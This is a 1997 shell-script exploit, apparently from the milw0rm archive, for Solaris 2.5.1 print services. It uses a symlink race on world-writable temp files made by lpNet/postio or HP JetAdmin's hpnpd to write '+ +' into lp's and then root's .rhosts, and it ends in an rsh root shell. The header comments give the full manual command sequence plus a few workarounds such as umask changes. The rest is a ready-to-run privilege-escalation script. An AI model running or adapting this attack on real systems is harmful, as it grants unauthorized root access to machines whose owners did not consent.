#!/bin/sh
#
# lpNet & temp file exploit:
#   break lp, then use lp priv to break root (or bin, etc...).
#
#   Written by: Chris Sheldon (csh@viewgraphics.com)
#
#   Tested on Solaris-2.5.1:
#     SunOS testhost 5.5.1 Generic sun4m sparc SUNW,SPARCstation-20
#
#   Caveat: This system is running without patches. Sun released
#     patch 103959-03 for 2.5.1 on Feb 27, 1997. lpNet and lpsched
#     were replaced in that patch, but the patch README does not
#     mention anything about a temp file or permissions problem.
#     103959-03 is in the recommended patch list, but not in the
#     "Patches containing security fixes" list.
#
#   This way (not using HP JetAdmin) *seems* to only work when you have
#   a postscript-only defined printer. If you send an ascii job to the
#   print queue, lpNet will invoke several of the /usr/lib/lp/postscript
#   programs to convert the ascii into postscript. One of them, postio(1),
#   creates a temp file in /var/tmp mode 666. If the request is sent from
#   a remote system (eg. handled by lpNet), then postio(1) runs as lp and
#   creates /var/tmp/<printer-name>.log as lp mode 666.
#
#   Here's part of the /var/lp/logs/request file:
#
#   = lp0-71, uid -1, gid -1, size 123, Sat May  3 03:26:14 PDT 1997
#   x /usr/lib/lp/postscript/postprint
#   y /usr/lib/lp/postscript/download -plp0|/usr/lib/lp/postscript/postio \
#       2>>$ERRFILE -L/var/tmp/lp0.log
#   t simple
#
#   What if you don't have a PS-only printer? Well, if you are using
#   the HP JetAdmin software and are running the hpnp daemon, then
#   you're just as vulnerable. The JetAdmin software creates a temp
#   file /var/tmp/jadump as lp with mode 666. It's happily follows
#   symlinks.
#
#   So, then exploit essentially is:
#     ln -s ~lp/.rhosts /var/tmp/<printer-name.log>
#      -or-
#     ln -s ~lp/.rhosts /var/tmp/jadump
#     rsh somehost lp somefile.txt
#     echo "+ +" >> ~lp/.rhosts
#     rsh -l lp localhost /bin/sh -i
#     mv /var/lp/logs/lpsched /var/lp/logs/lpsched.save
#     ln -s /.rhosts /var/lp/logs/lpsched
#     /usr/sbin/lpshut
#     /usr/lib/lpsched
#     mv /var/lp/logs/lpsched.save /var/lp/logs/lpsched
#     echo "+ +" >> /.rhosts
#     rsh -l root localhost /bin/sh -i
#
#  Note: This won't clobber the permissions on an existing /.rhosts
#    file, but you can always symlink to /usr/bin/.rhosts.
#
#  Workaround:
#    Put "umask 022" in /etc/init.d/lp. /var/tmp/<printer-name>.log
#      will be mode 644. This also makes /var/lp/logs/lpsched
#      created as mode 644.
#    For /var/tmp/jadump, the umask trick didn't work. I just made
#    /usr/spool/lp 755 root/root (was 775 lp/lp).
#
#  I suppose as a general principal, it's a good thing to go around
#  as root and touch /.rhosts /usr/bin/.rhosts /usr/spool/lp/.rhosts
#  and /var/adm/.rhosts as 600 root/root. I also run a script which
#  checks the files (and their contents) on a regular basis.
#
#  Perhaps there should be a file called /etc/rusers which, like the
#  /etc/ftpusers file, denies any user in that file password-less
#  r-service access.
#
#  Of course, you still have to worry about things like .forward.
#  A more draconian approach would be to change /var/spool/lp to
#  mode 755 and owned by root. What would this break?? (anything?)
#
#  This is the JetAdmin/hpnpd script:
#

#
# Usage stuff.
if [ "$1" = "" ]; then
  echo "Usage: lp-exp <remote-host> [remote printer name]"
  echo "         remote-host: host must have networked printer"
  echo "           with the main spool on the local system."
  exit
else
  remlp=$1
fi

#
# Specify a different queue
if [ "$2" != "" ]; then
  remqn=$2
fi

#
# Check for ~lp/.rhosts
if [ -f /usr/spool/lp/.rhosts ]; then
  echo "lp's .rhosts file exists... sorry"
  exit
fi

#
# Check if hpnpd is running
if [ "`ps -e | grep hpnpd`" != "" ]; then
  echo "found hpnpd running"
  rm -f /var/tmp/jadump
  ln -s /usr/spool/lp/.rhosts /var/tmp/jadump
else
  echo "If you have a postscript only printer, try that (see comments)."
  exit
fi

#
# print some data on a remote system
if [ "$remlp" = "" ]; then
  rsh $remlp "echo ASCII-STRING | lp"
else
  rsh $remlp "echo ASCII-STRING | lp -d$remqn"
fi

sleep 3

#
# Check for the new .rhosts file and break root
if [ -f /usr/spool/lp/.rhosts ]; then
  rm -f /var/tmp/jadump
  echo "+ +" >> /usr/spool/lp/.rhosts

  rsh -l lp localhost "rm /usr/spool/lp/.rhosts ;\
    mv /var/lp/logs/lpsched /var/lp/logs/lpsched.save ;\
    ln -s /.rhosts /var/lp/logs/lpsched ;\
    /usr/sbin/lpshut ;\
    sleep 3 ;\
    /usr/lib/lpsched ;\
    mv /var/lp/logs/lpsched.save /var/lp/logs/lpsched ;\
    echo \"+ +\" >> /.rhosts"
else
  echo "Hmmm... no .rhosts file was created."
  exit
fi

rsh -l root localhost /bin/sh -i

#
#
#

# milw0rm.com [1997-05-03]